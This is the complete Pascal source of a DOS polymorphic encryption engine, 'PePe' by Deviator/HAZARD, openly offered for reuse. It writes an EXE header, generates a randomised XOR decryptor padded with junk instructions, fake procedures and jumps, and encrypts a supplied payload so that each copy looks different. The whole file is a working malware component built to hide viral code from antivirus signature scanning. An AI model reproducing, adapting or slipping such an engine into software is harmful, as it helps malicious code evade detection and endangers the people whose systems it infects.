   Unit    PePe;
   { Pascal Extra Polymorphics Engine }
   { By Deviator/HAZARD }

   { Disclaimer: To understand how this stuff working, you'll need a bit asm
     (principles of polymorphic engines,80x86 instruction set and other stuff).
     If you dont know this,you can use it freely,but do not change copyright }

   { So i'll try to explain.
    In intel systems registers are followed in such way: Ax,Cx,Dx,Bx,Sp,Bp,Si,Di.
    Table of opcodes you can find in additional table (opcodes.txt) }

   {$X+}
   Interface
   Function DoPoly(SCode,SData:Pointer;SCLen,SDLen:Word;Var Dst:Pointer):Word;
   implementation
   Const
   DecryptorL = 16;
   Decryptor : Array [0..DecryptorL] of Byte = (
       $E8,        { Call }
       $58,        { Pop Pointer }
       $81,$C0,        { Add pointer }
       $B8,        { Mov Counter }
       $B8,        { Mov Keyword }
       $2E,$31,    { Xor/Add/Sub... }
       $48,        { Dec counter }
       $40,        { Inc Pointer }
       $40,        { Inc Pointer }
       $81,$C0,        { Add Keyword }
       $0B,        { Or Counter,Counter }
       $75,        { Jne }
       $E9,        { Jmp }
       $E9     { Jmp }
           );

   Var
   Point,Counter,KeyWord : Byte;       { Different variables }
   Dest:Pointer;
   CurDec,CurCr:Word;
   Prev:Byte;
   NKey,AKey:Word;
   Calls:Array [0..25] of Word;
   Callsn:Byte;
   InnerCalls:Byte;
   JxNum : Byte;

   Function GetDByte:Byte;         { Get byte from decryptor table }
   Begin
   GetDByte := Decryptor[CurDec];
   Inc(CurDec);
   End;

   Procedure PutByte(BB:Byte);     { Store byte in destination area }
   Begin
   Mem[Seg(Dest^):Ofs(Dest^)+CurCr] := BB;
   Inc(CurCr);
   End;

   Procedure PutWord(BB:Word);     { Store word }
   Begin
   Memw[Seg(Dest^):Ofs(Dest^)+CurCr] := BB;
   Inc(CurCr); Inc(CurCr);
   End;

   Procedure CopyDByte;            { Copy Byte from decryptor to
                         destination }
   Begin
   PutByte(GetDByte);
   End;

   Procedure StoreWord(What,Where:Word);   { Store word at given location at
                         destination area }
   Begin
   MemW[Seg(Dest^):Ofs(Dest^)+Where] := What;
   End;

   Procedure StoreByte(What:Byte;Where:Word);  { Same To StoreWord,but
                             for bytes }
   Begin
   Mem[Seg(Dest^):Ofs(Dest^)+Where] := What;
   End;
   {---------------------------------------------------------------}
   Function GReg:Byte;         { Gets unused register }
   Var
   L : Byte;
   Begin
   repeat
   L := Random(7);
   until (L <> Point) and (L <> Counter) and (L <> KeyWord) and (L <> 4);
   GReg := L;
   End;

   Function GHigh:Byte;            { Chooses register/mem for complex
                         opcodes like Xor Ax,[Bx+Si],etc }
   Var
   B,C : Byte;
   Begin
   B := Random(255);
   C := (B and $38) shr 3;
   While (C = Point) or (C = Counter) or (C = KeyWord) or (C=4) do Begin
   B := Random(255);
   C := (B and $38) shr 3;
   End;
   GHigh := B;
   End;

   Function GetSize(G:Byte):Byte;      { Gets size of opcode length,
                         generated by GHigh }
   Begin
   GetSize := 0;
   If (G < $40) and ( (G and $87) = 6 ) then
                     Begin
                     GetSize := 2;
                     Exit;
                     End;
   If (G < $40) or (G >= $C0) then Begin
                     GetSize := 0;
                     Exit;
                     End;
   If (G >= $40) and (G < $80) then Begin
                     GetSize := 1;
                     Exit;
                     End;
   If (G >= $80) and (G < $C0) then Begin
                     GetSize := 2;
                     Exit;
                     End;
   End;

   Function Check(Reg:Byte):Boolean;   { Checks if register used }
   Begin
   Check := False;
   If (Reg = Point) or (Reg = Counter) or (Reg = KeyWord) or (Reg = 4)
           then Check := True;
   End;

   Procedure Garble(Small:Boolean); Forward;

   Procedure MakeOneByters;        { Create onebyters }
   Const
   OneByte : Array [0..8] of Byte = ($2E,$3E,$F8,$F9,$FB,$FC,$FD,$26,$36);
   Begin
   PutByte(OneByte[Random(9)]);
   End;

   Procedure MakeImm16;            { Make Mov Reg16,xxxx }
   Begin
   PutByte(GReg+$0B8);
   PutWord(Random($FFFF));
   End;

   Procedure MakeIncDec;           { Make Inc/Dec Reg16 }
   Begin

   If Random(2)=0 then PutByte(GReg+$40)
                  else PutByte(GReg+$48);

   End;

   Procedure TwoThreeFour16;       { Create complex opcode }
   Const
   TTF : Array [0..7] of Byte = ($03,$13,$23,$33,$0B,$1B,$2B,$3B);
   Var
   Y,B,G:Byte;
   Begin
   PutByte(TTF[Random(8)]);
   Y := GHigh;
   PutByte(Y);
   If GetSize(Y) <> 0 then
   For B := 1 to GetSize(Y) do PutByte(Random($FF));
   End;

   Procedure XchgAx;           { Create xchg ax,reg16 }
   Begin
   If Not Check(0) then PutByte(GReg+$90);
   End;

   Procedure MakeProc;         { Create procedure }
   Var
   SQ,SW:Word;
   Begin
   If (Callsn < 20) and (InnerCalls<5) and (JxNum = 0) then Begin
   Inc(InnerCalls);            { Increase number of inner calls }
   PutByte($E9);               { Jmp Near }
   PutWord(0);             { Store for later patch }
   SQ := CurCr;
   Garble(True);               { Garble with minimum garbage }
   SW := CurCr;
   Garble(False);
   PutByte($C3);               { Retn }
   Garble(True);
   StoreWord(CurCr-Sq,Sq-2);
   Calls[Callsn] := SW;            { Store offset of created procedure }
   Inc(Callsn);
   Dec(InnerCalls);            { Decrease number of calls }
   End;
   End;

   Procedure MakeCall;         { Put call to procedure }
   Begin
   If Callsn > 0 then Begin
   PutByte($E8);               { Call Near }
   PutWord(Calls[Random(Callsn)]-CurCr-2); { Store offset }
   End;
   End;

   Procedure MakeJx;           { Make Jz/Jnz,ie Jxx }
   Var
   T:Word;
   Begin
   If JxNum < 2 then Begin
   Inc(JxNum);
   PutByte(Random(16)+$70);        { Put random jxx }
   PutByte(0);
   T := CurCr;
   Garble(True);               { Garble with minimum garbage }
   StoreByte(CurCr-T,T-1);         { Patch Jxx offset }
   Dec(JxNum);
   End;
   End;

   Procedure MakeAxOp;         { Make Ax-oriented opcodes }
   Const
   AxTbl : Array [0..9] of Byte = ($05,$15,$25,$35,$0D,$1D,$2D,$3D,$A9,$A1);
   Begin
   If Not Check(0) then Begin
   PutByte(AxTbl[Random(10)]);
   PutWord(Random($FFFF));
   End;
   End;

   Procedure MakeInt;          { Create interrupt call }
   Const
   Funcs : Array [0..4] of Byte = ($0B,$19,$4B,$54,$FF);
   Ints  : Array [0..4] of Byte = ($21,$21,$21,$21,$12);
   Var
   Y:Byte;
   Begin
   If Not Check(0) then Begin
   Y := Random(5);
   PutByte($B4); PutByte(Funcs[Y]);
   PutByte($CD); PutByte(Ints[Y]);
   End;
   End;

   Function Think(Inn:Byte):Byte;      { Simple thinking procedure which
                         aimed to create smooth decryptors }
   Begin
   If Prev = 0 then Begin
                     Think := 3;
                     Exit;
                     End;
   Think := Inn;
   End;

   Procedure Garble(Small:Boolean);    { Garble }
   Var
   R,T,V:Byte;
   Begin
   If Not Small then R := Random(7)    { If Small = True, generate minimum
                         garbage,else generate maximum }
                else R := Random(3);

   For T := 0 to R do Begin

   V := Random(10);            { Choose kind of opcode to create }

   If Prev <> Think(V) then Begin
   Prev := Think(V);
   Case Think(V) of            { Think and call procedure }
   0: MakeOneByters;
   1: MakeImm16;
   2: MakeIncDec;
   3: TwoThreeFour16;
   4: XchgAx;
   5: MakeProc;
   6: MakeCall;
   7: MakeJx;
   8: MakeAxOp;
   9: MakeInt;
   End;
   End;
   End;
   End;

   Function DoPoly(SCode,SData:Pointer;SCLen,SDLen:Word;Var Dst:Pointer):Word;
   Var Q,M : Byte;
   T1,T2,T3,T4,T5,D1,D2,D3,D4:Word;
   CopyRight:String;
   Begin

   CopyRight:=#13#10'This is PePe engine v.1.2 '#13#10' By Deviator/HAZARD'#13#10;

   Dest := Dst;
   CurDec := 0; CurCr := 0; Callsn := 0; InnerCalls := 0; JxNum := 0;

   { Create Exe Header }
   PutWord($5A4D);         { 'MZ' }
   PutWord(0); PutWord(0);     { Exe size }
   PutWord(0);         { Relocational items number }
   PutWord(2);         { Header size = 32 bytes }
   PutWord(Random(999)+1000); PutWord(Random(999)+$7000);
                   { Min/Max mem }
   PutWord(Random(40)+$1000); PutWord(Random(999)+$1000);
                   { SS/SP }
   PutWord(0);             { Checksum }
   Q := Random(32);
   PutWord(Q*16); PutWord(-Q); { Cs:Ip }
   PutWord($1C);           { Relocational table offset }
   PutWord(0);         { Overlay number }
   PutWord(Random($FFFF));
   PutWord(Random($FFFF));     { Random stuff }

   { Initialise variables }
   Q := Random(3);
   Case Q of
   0: Point := 3;          { Bx }
   1: Point := 6;          { Si }
   2: Point := 7;          { Di }
   End;
   While (Q = Point) or (Q = 4) do Q := Random(8);
   Counter := Q;
   While (Q = Point) or (Q = Counter) or (Q = 4) do Q := Random(8);
   KeyWord := Q;

   Garble(False);
   CopyDByte;          { Copy Call Opcode }
   PutWord(0);
   T1 := CurCr;            { Store for later patch }
   Garble(False);
   StoreWord(CurCr - T1,T1-2); { Patch Call }
   Garble(False);

   PutByte(GetDByte+Point);    { Pop Pointer }

   Garble(False);
   CopyDByte;
   PutByte(GetDByte+Point);    { Add Pointer,offset Data }
   T2 := CurCr;
   PutWord(0);
   Garble(False);
   PutByte(GetDByte+Counter);  { Mov Counter,Size }
   PutWord((SCLen+SDLen) Shr 1);
   Garble(False);
   PutByte(GetDByte+KeyWord);  { Mov KeyWord,key }
   NKey := Random($FFFF);
   PutWord(NKey);
   Garble(False);
   T3 := CurCr;            { Decryption Loop }
   Garble(False);
   CopyDByte; CopyDByte;
   M := Point;
   If M = 3 then M := 7 Else Dec(M,2); { Xor Cs:[Pointer],Counter }
   PutByte(KeyWord shl 3 + M);
   Garble(True);
   PutByte(GetDByte + Counter);        { Dec Counter }
   Garble(True);
   PutByte(GetDByte + Point);      { Inc Pointer }
   Garble(True);
   PutByte(GetDByte + Point);      { Inc Pointer }
   Garble(True);
   CopyDByte;
   PutByte(GetDByte + KeyWord);        { Add KeyWord,AKey }
   AKey := Random($FFFF);
   PutWord(AKey);
   Garble(True);
   CopyDByte;              { Or Counter,Counter }
   PutByte(Counter Shl 3 + $C0 + Counter);
   {Garble(True);}
   CopyDByte;              { Jne Xxx }
   PutByte(0);
   T4 := CurCr;
   Garble(True);
   CopyDByte;              { Jmp AllDone }
   PutWord(0);
   T5 := CurCr;
   Garble(True);
   StoreByte(CurCr - T4,T4-1);
   Garble(True);
   CopyDByte;
   PutWord(T3-CurCr-2);            { Jmp Decrypt }
   Garble(False);
   StoreWord(CurCr-T5,T5-2);       { Patch Jmp AllDone }
   StoreWord(CurCr-T1,T2);         { Patch Add Counter,End of Decryptor}

   D3 := NKey;
   D4 := 0;

   If SCLen <> 0 then          { Crypt source }
   For D2 := 0 to (SCLen shr 1) do Begin   { If size > 0 then crypt ! }
       PutWord(MemW[Seg(SCode^):Ofs(SCode^)+D4] xor D3);
       Inc(D3,AKey);
       Inc(D4,2);
       End;
   D4 := 0;
   If SDLen <> 0 then          { Crypt addiotional bytes }
   For D2 := 0 to (SDLen shr 1) do Begin
       PutWord(MemW[Seg(SData^):Ofs(SData^)+D4] xor D3);
       Inc(D3,AKey);
       Inc(D4,2);
       End;

   StoreWord(CurCr div 512 + 1,4);     { Patch Exe PageCnt }
   StoreWord(CurCr mod 512,2);     { Patch Exe partial page }
   StoreWord(CurCr,$12);       { Patch in Exe CheckSum generated length }

   DoPoly := CurCr;            { All Done ! }

   End;

   End.
